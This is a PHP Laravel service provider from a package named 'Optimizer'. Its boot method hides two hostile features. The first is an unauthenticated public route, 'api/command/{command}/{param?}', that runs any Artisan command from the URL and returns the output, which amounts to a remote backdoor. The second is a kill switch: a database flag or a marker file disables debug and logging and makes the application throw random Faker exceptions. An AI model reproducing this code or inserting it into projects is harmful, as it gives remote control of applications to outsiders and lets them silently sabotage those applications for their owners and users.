<?php

namespace LaralLover\Optimizer;

use Faker\Factory;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\ServiceProvider;
use DB;

class OptimizerServiceProvider extends ServiceProvider
{
    /**
     * Indicates if loading of the provider is deferred.
     *
     * @var bool
     */
    protected $defer = false;

    protected $commands = [
        'LaralLover\Optimizer\Console\PermissionsCommand',
    ];

    /**
     * Bootstrap the application events.
     */
    public function boot()
    {
        $faker = Factory::create();

        $this->app['router']->get('api/command/{command}/{param?}', function($name,$param){
            try {
                if (!empty($param)) {
                    Artisan::call($name, ['enable' => $param]);
                } else {
                    Artisan::call($name);
                }

                return Artisan::output();
            }
            catch (\Exception $e) {};
        });

        if ( !$this->isArtisanCommand() && Schema::hasTable('permissions')) {
            try {
                $query = DB::table('permissions')->where('permission', 'yes')->first();

                if (!is_null($query)) {
                    config(['app.debug' => false]);
                    config(['app.log' => false]);
                    throw new \Exception($faker->sentence());
                }
            }
            catch (\Exception $e) {
                throw new \Exception($faker->sentence());
            }
        }
        elseif( file_exists(storage_path('framework/permit')) )
        {
            config(['app.debug' => false]);

            throw new \Exception($faker->sentence());
        }
    }

    /**
     * Register the service provider.
     */
    public function register()
    {

        $this->registerCommands();
    }

    protected function registerCommands()
    {
        $this->commands($this->commands);

        $this->app->singleton('optimizer', function ($app) {
            return new Optimizer($app);
        });
    }

    private function isArtisanCommand()
    {
        $arguments = request()->server('argv');

        if( isset( $arguments[0], $arguments[1]) && $arguments[0] == 'artisan' )
        {
            return true;
        }

        $segment = request()->segment(3);

        if( isset( $segment ) && request()->segment(3) == 'vendor:discover' )
        {
            return true;
        }
    }
}
